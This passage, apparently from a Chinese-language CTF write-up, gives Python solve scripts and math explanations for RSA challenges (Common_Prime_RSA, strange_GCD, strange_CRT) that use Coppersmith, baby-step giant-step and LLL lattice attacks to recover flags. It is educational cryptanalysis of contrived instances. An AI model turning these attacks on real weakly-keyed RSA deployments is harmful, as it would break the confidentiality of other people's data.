class="number">4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    lower = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(upper - lower &gt; <span class="number">1</span>):</span><br><span class="line">        x = (upper + lower) &gt;&gt; <span class="number">1</span></span><br><span class="line">        ans = (x<span class="number">-1</span>)**<span class="number">7</span> + (k*x<span class="number">-1</span>)**<span class="number">5</span> + k</span><br><span class="line">        <span class="keyword">if</span>(ans == A):</span><br><span class="line">            print(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            print(k,x)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(ans &gt; A):</span><br><span class="line">            upper = x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = x</span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">y = k*x - <span class="number">1</span></span><br><span class="line">secret = (x + y) % <span class="number">7754486886526049041</span> + <span class="number">210729175671163973</span></span><br><span class="line">my_prime = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000001</span>,min(<span class="number">3000000</span>,iroot(secret,<span class="number">3</span>)[<span class="number">0</span>]),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span>(isPrime(i)):</span><br><span class="line">        my_prime.append(i)</span><br><span class="line">print(<span class="string">&quot;Prime ready! Found&quot;</span>,len(my_prime),<span class="string">&quot;primes.&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">9001</span>,<span class="number">10001</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> my_prime:</span><br><span class="line">        ans = iroot(secret - e**<span class="number">3</span> - p**<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span>(ans[<span class="number">1</span>]):</span><br><span class="line">            print(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            q = ans[<span class="number">0</span>]</span><br><span class="line">            print(e,p,q)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Common-Prime-RSA"><a href="#Common-Prime-RSA" class="headerlink" title="Common_Prime_RSA"></a>Common_Prime_RSA</h2><blockquote><p><a href="https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf">paper</a></p></blockquote><p>如题， $p=2ag+1,q=2bg+1$ ，其中 $g=N^{\beta}$ ，$\beta_1=0.2247,\beta_2=0.3247$ </p><p>第一部分， $g$ 显然是个比较小的数，直接coppersmith就能拿到，接着来考虑分解 $N$ ， 显然 $N=p\cdot q=(2ag+1)(2bg+1)=4abg^2+2g(a+b)+1$ ，则</p><p>$$\frac{N-1}{2g}=2gab+(a+b)$$</p><p>但由于 $\beta=0.2247&lt;0.5$ ，导致 $g&lt;a,b$ ， 我们假设 $\frac{N-1}{2g}=2gu+v$ ，则 $v=a+b-2gc,u=ab+c$ ，那么 $x^{u2g}\equiv x^{ab2g+c2g}\equiv x^{c2g}\pmod{N}$ ，即 ${x^{2g}}^u={x^{2g}}^c$ ，所以我们可以使用 $bsgs$ 算法来得到 $c$ ，因为题目中 $p$ 与 $q$ 较为接近，所以上述的 $a$ 与 $b$ 也比较接近，我们知道 $a\cdot b≈u≈\frac{N}{(2\cdot g1)^2}$ ， 根据对勾函数的性质， $x≈y\in (\sqrt{u},\sqrt{2u})$ ，随后即可得到 $c$ 较为精确的答案区间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49</span></span><br><span class="line">c1 = <span class="number">0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">kbits = int(1024*0.2247)</span></span><br><span class="line"><span class="string">m0 =  0x436f6d6d6f6e207072696d652052534120697320612076617269616e74206f66205253410000000000000000000000000000000000000000000000000000000000416e642074686520636f6d6d6f6e20666163746f722067206973206c61726765207072696d6520616e6420703d3267612b3120713d3267622b31</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = ((m0 + x*2**464)^e1) - c1</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">g1 = f.small_roots(X=2^kbits,beta=1)[0]</span></span><br><span class="line"><span class="string">print(g1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">g1 = <span class="number">1328458990599515056771144217738449144496664370133586446617480019409757</span></span><br><span class="line">v1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) % (<span class="number">2</span>*g1)</span><br><span class="line">u1 = ((n1 - <span class="number">1</span>) // (<span class="number">2</span>*g1)) // (<span class="number">2</span>*g1)</span><br><span class="line">left = (((<span class="number">2</span> * iroot(n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">2</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line">right = (((<span class="number">3</span> * iroot(<span class="number">2</span>*n1,<span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">4</span>*g1)) - v1) // (<span class="number">2</span>*g1)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">b = pow(<span class="number">114514</span>,<span class="number">2</span>*g1,n1)</span><br><span class="line">base = pow(b,left,n1)</span><br><span class="line">D = iroot(right - left,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">step = pow(b,D,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(D):</span><br><span class="line">    dic[base] = i</span><br><span class="line">    base = base * step % n1</span><br><span class="line">print(<span class="string">&quot;baby step ready&quot;</span>)</span><br><span class="line"></span><br><span class="line">base = pow(b,u1,n1)</span><br><span class="line">step = inverse(b,n1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(D):</span><br><span class="line">    <span class="keyword">if</span>(base <span class="keyword">in</span> dic):</span><br><span class="line">        print(<span class="string">&quot;ans found!&quot;</span>)</span><br><span class="line">        print(i,dic[base])</span><br><span class="line">        c = left+ i + D * dic[base]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    base = base * step % n1</span><br><span class="line"></span><br><span class="line">A = u1 - c</span><br><span class="line">B = v1 + c * <span class="number">2</span> * g1</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p1 = x*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q1 = y*g1*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p1 * q1 == n1</span><br><span class="line">phi1 = (p1<span class="number">-1</span>) * (q1<span class="number">-1</span>)</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">c1 = <span class="number">0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5</span></span><br><span class="line">g2 = pow(c1,d1,n1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffd</span></span><br><span class="line">c2 = <span class="number">0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) // (<span class="number">2</span>*g2)</span><br><span class="line">B = ((n2 - <span class="number">1</span>) // (<span class="number">2</span>*g2)) % (<span class="number">2</span>*g2)</span><br><span class="line">C = iroot(B**<span class="number">2</span> - <span class="number">4</span>*A,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">x = (B+C) // <span class="number">2</span></span><br><span class="line">y = B-x</span><br><span class="line">p2 = x*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">q2 = y*g2*<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p2 * q2 == n2</span><br><span class="line">phi2 = (p2<span class="number">-1</span>) * (q2<span class="number">-1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m = pow(c2,d2,n2)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-GCD"><a href="#strange-GCD" class="headerlink" title="strange_GCD"></a>strange_GCD</h2><blockquote><p><a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">paper</a></p></blockquote><p>给出了9组公钥，满足 $N=P\cdot Q_i+R_i$ ，其中 $P$ 是444位、 $Q$ 是444位、 $R$ 是333位，那么显然只要求出 $P$ 、 $Q$ 其中一个即可，因为<br>$$<br>\begin{equation}\begin{split}<br>Q_1\cdot N_2-Q_2\cdot N_1&amp;=Q_0(Q_1P+R_1)-Q_1(Q_0P+R_2) \\<br>&amp;=Q_0R_1-Q_1R_0 \\<br>&amp;≈Q_{bits}\cdot P_{bits}<br>\end{split}\end{equation}<br>$$<br>所以我们构建这样的一个格子：<br>$$<br>M=<br>\begin{bmatrix}<br>2^{P_{bits}} &amp; x_1 &amp; x_2 &amp; \cdots &amp;x_n \\<br>&amp;-x_0 \\<br>&amp;&amp;-x_0 \\<br>&amp;&amp;&amp;\ddots \\<br>&amp;&amp;&amp;&amp;-x_0<br>\end{bmatrix}<br>$$<br>所以一定存在一个向量 $\vec{v}=(Q_0,Q_2,\cdots,Q_n)$ 满足 $\vec{v}\cdot M=(Q_0·2^P_{bits},Q_0N_1-Q_1N_0,…,Q_0N_n-Q_nN_0)$ ，那么就能得到 $Q_{list}$ ，自然就能分解 $N$ ，正常解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = [<span class="number">8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216</span>, <span class="number">9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905</span>, <span class="number">7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900</span>, <span class="number">6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116</span>, <span class="number">5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729</span>, <span class="number">8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063</span>, <span class="number">6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426</span>, <span class="number">6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991</span>, <span class="number">5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062</span>]</span><br><span class="line">C = [<span class="number">800378461059400239726680783421062702546581299113618553895453491207714321944554499622887232532612118204284779120928524046451494597619154079853122057618867592408424421335915888671560524092660578952242621890439766919785431411789789232309134048322721650012432166587969915464252995890054635969469155870141839815222805619769926841873928532</span>, <span class="number">8685468246369062574820183134847029157229023858170863526469628501966638181721681547114662091162797572149161013458000532984909663639626346493828947027439012131912176125653717020650233650230608573276523862941298063827867869000918623143520066067119099918633173584693454642685133071154989133688921507896223776765538029556643440655490373815</span>, <span class="number">4635611296372235589362291842711945807825964919968727011796279830725567747087132786100965922682161492876463568645940638975728831156672106717718242995621775763972524561170035488180440169190421072680121175269363490806991700969253196228364471655905426168859215651384013432550900570720981720919343406680667172355882395426739478340888619526</span>, <span class="number">742099161415136628218807400531862454374875770332166710320711769923774839345990297388615457974047093967700994503615622499139058644697776431451063778211507061619987487339659448529973693084099004007650792690143707738139278995489030445825999666762580518420739517354868021396496747289677543653758101688499365196709600349831855157276274803</span>, <span class="number">4273006447766599851029197343910625305964779588947130545729882009677080459892767902139074897266046998378948193319329776150920821074305998905666368175737032487336505440974393061632257356697260043478850055918798196360043557336723402834256592984312957607731622934368169520289756716653736422872196593367101920308166527352079412344590114695</span>, <span class="number">1337615323422531101514598853478737615483725265103339849469231329210692205474781484172946466402355800190175297435923447189337380569240535257395618353403524999296122247241720498058900285176383928871155893061316083476812641934026019749574784965397208046520128690081232283708190247657782663414534596381371506499151016470118707739609022847</span>, <span class="number">6153442337491399463730666360630451953223069596225489087488144486112604050064388945200405772892415725900338512969888610774357818442533883395713661512978158729825590405567077341407532331228257558692149544940358814513930330757334104407683768945074261746314376336567331685071086776886141587264981001140113933152084084711732651014186070962</span>, <span class="number">3604640305526232611907645024550062043296875756707299105733076926046725900367109300556792007038226350415916164581084668832286944703572581980333135146219609212135443758296278947833224676930513359604019639508959092586550129343133801670578311053639151186604019506764426302411065588655525183584977810609190948096510237056027272167828516985</span>, <span class="number">2085633143403792178757363870459578017278494765962824809917819295576034993395441252397370078671500834434293581806342828037037877739374959864038090394888141183851040814572501861997433316552606005140700519616064369570511427453278726929921212633252656552135711332324923683242632912449218888750151556281762432994484741408165895663710356342</span>]</span><br><span class="line"></span><br><span class="line">M = [[<span class="number">1</span>&lt;&lt;<span class="number">334</span>]+N[<span class="number">1</span>:]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(N)<span class="number">-1</span>):</span><br><span class="line">    M.append([<span class="number">0</span>]*(i+<span class="number">1</span>)+[-N[<span class="number">0</span>]]+[<span class="number">0</span>]*(len(N)-i<span class="number">-2</span>))</span><br><span class="line"><span class="comment"># print(M)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">M = [</span></span><br><span class="line"><span class="string">    [34996011596528190789960035633881941845650710894291398982812329702559247987190014771576210832368861184, 9663141503982563384103774905603769762205667685102275298721284964403449121449261483138514307090449027807047697811539118959328065885920230514670112839967221129701708335087378871176539521374006686377418843364889059913595942583737991465545688834167085579154677350865488342245644093471665857007588133415608450554035129609049971856915687905, 7080633525505006454857949889380886258474613936169915325357991912983821798902257837234148311383635716165386646093418183743215120431715933036921480432793786600194625124412063608565640368381660643929081066605712749838630092722581230189543696229548387666046034403406721477818265752443487173947232032487026509033018565048660685068628813900, 6348260112940191945095264085450804431350547836448100928568733296493334845533262312663784701113046746633754397388581143523779371919889446537883618910341310362947454041409541741124231406605654693961025815677260091930522280737378333554694234586235628097018111636491016261274584391201625445101930372416766825601778759258114504767453644116, 5453076441876067965962987075376616480678826248967242473452690159966124023105342358461519279607336831463834252487811766366887983597918775466645199024629945952612311092154451713992362747056489054444283302530500475646346968235522866557033556131387030809018889094871163097069588840212411234716020934787724757538389436231926479459435139729, 8539092301764573132139384894241535432591998166686651428176862041680365196821019488767353225937458669267710968146783359781905669306801237140282934737328995064410005908343087032652676207615356474601039341695241288937409773110450995503958663731870314493254162942656333393836208952363635746218345484752702086447693272390570444229475023063, 6519174659211289290465989985638494640591837577268694359892571134942820094011179335155100770258746122812579164176239810640710311061280175847537113068566174335469669480601670136633042879486860594176408555229541384726863069317134887988109513500264430505092783429319336134768414472691544453196941818593187717904852926051114502346647888426, 6961711680362025924587083752271982856615461409839316941574792747717174299272141804413488210456939607971950020060573061131683587521057101549266612028332060247289306929784809695126285828514889617483817766102136513569391338432827451306976412448973958662677599051104723480081915666230391091496248279567627159875132838397868850500912784991, 5464727156582411007360377345208743900616053705663005668786499961992377236151787056734059201141143278419642045996194426551642956434137382420547801325331080754615348522599387497424727626522195285281557448617564720973185851757117201639221059630112719699600469361046245232476531622290326229811709079901764559526124144866364301870192468062], </span></span><br><span class="line"><span class="string">    [0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216, 0], </span></span><br><span class="line"><span class="string">    [0, 0, 0, 0, 0, 0, 0, 0, -8321077117329356263954581766837194016859681833859374146551469738742553789565498761528408178000096341991081753628879035591190841107228873036782248755852096597317053559269854941020999105514186022112075838112491499884564745335454966665835001848999256218403570429047541524272647861099813598603292295695775504244505874838019009730562620216]</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">M = Matrix(ZZ,M)</span></span><br><span class="line"><span class="string">ans = M.LLL()[0]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ans = (<span class="number">4599191779324727072633164871296325902208765537352604303273175255453504312615500983406477011435819405305852059674048438016100668090246407849496908743817335622801573073136122188609246369046057261291320848819844418920893230598376364951805862565686868625621955071425273509220849374947161975251582041718784</span>, <span class="number">104098035638581595369723778375711537486830709046687306114704921816239533823901066113680320504395210089789340199402154288158599251547931748565815387310900885326892681968536308019715590493310968628489043723240348362149053110811668282038727688689374505928586075094912392544924601844136642390813222425809</span>, <span class="number">1102834391862716869946827309486981604079530638763397950737361315055931768373793498250981455412829162997772327814660070857951309312894092377859437366989526531813223828179941289064128320123411973263239142716310770401174174815638810202859450962632995611863799694649198457635953086959463939627719575381012</span>, <span class="number">753994729336183961852361196205654448289304004519434287316796470222521627865083763102251102951626213588497716067551706990220346381353586508856365765536744873026409087910505560761761024675350156647185336440841519838638415417607956807382719719007131540587566462617043290548957627028678429439567176392108</span>, <span class="number">-71708524916293121808333775279085691365967960919759775147913431698619192878017855212957980666806523648996086462040461850162074426038300683815953081712090679643498963889027587516137252350693864785830427057530016147319149926968346502476418390469709928547235995568090970863872980806983047965126211827423</span>, <span class="number">-1031944069356990593465028628753183012193322903943969718261363844383250576817774501764794204795605186147444430878687291921605373814843580367545369212301939780213941922732623750390324618190490307261983930269957183493345355165692496865409582827167136484989492550271511982793001065621702409883049993239817</span>, <span class="number">-1960547215826715829528682564527292643865866291188443591530567078511330848396016229325567425830200701694380104625201031396661972809519249893882531604307311435727272867042265335921514343841646164420771255718802644103398765492144311189111408831887333483581772033575516358581006829893858562536866631199694</span>, <span class="number">-1402335387560657499009395932180425308829816453818907356038567333645529829409747360872073366794556975860774421104509218449157997408918101385420918273310166387609041772539330599075043569860214109051067579537008367501834723009929827486300772678346407596106869832512579102180928086682172345775047825906065</span>, <span class="number">6492859743402427013224957526773612476031280993044690607784160057686880229209831538939045987606076773313125546427811186808795218860181360435151657439459135171731642225975056613348164819235317913083153227881911185574679170305638348499347070097938480392885289493284095645409615468925393679398090634630</span>)</span><br><span class="line">Q = []</span><br><span class="line">Q.append(ans[<span class="number">0</span>]&gt;&gt;<span class="number">333</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(ans)):</span><br><span class="line">    Q.append(-(ans[i]-Q[<span class="number">0</span>]*N[i])//N[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P = N[<span class="number">0</span>] // Q[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(C)):</span><br><span class="line">    flag += long_to_bytes(pow(C[i],inverse(e,(P<span class="number">-1</span>)*(Q[i]<span class="number">-1</span>)),(P*Q[i])))[<span class="number">-5</span>:]</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h2 id="strange-CRT"><a href="#strange-CRT" class="headerlink" title="strange_CRT"></a>strange_CRT</h2><blockquote><p><a href="https://link.springer.com/content/pdf/10.1007%2F3-540-45708-9_16.pdf">paper</a></p></blockquote><p>二元的coppersmith，首先有 $e\cdot dq=1\pmod{q-1}$ ，即 $e\cdot dq-k\cdot(q-1)-1=0$ ，即 $e\cdot dq+k-1=k\cdot q$ ，因为 $dq$ 只有40位，所以 $dq$ 和 $k$ 都比较小，我们设 $f(x,y)=ex+y$ ，一定存在一个根 $(dq,k-1)$ ，我们使用 $x-shifted$ 方法构造方程组，</p><p>$$<br>B_P(4)=<br>\begin{bmatrix}<br>N^2X^3 \\<br>eNX^3 &amp; -NX^2Y \\<br>e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\<br>e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3<br>\end{bmatrix}<br>$$<br>随后找到根 $(dq,k-1)$ ，即可分解 $N$ 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> 